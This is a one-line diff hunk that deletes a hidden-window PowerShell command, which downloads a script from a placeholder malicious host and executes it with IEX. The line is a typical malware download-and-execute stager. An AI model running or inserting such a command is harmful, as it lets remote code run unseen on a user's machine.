@@ -1,1 +1,0 @@
-powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malware.ps1')"
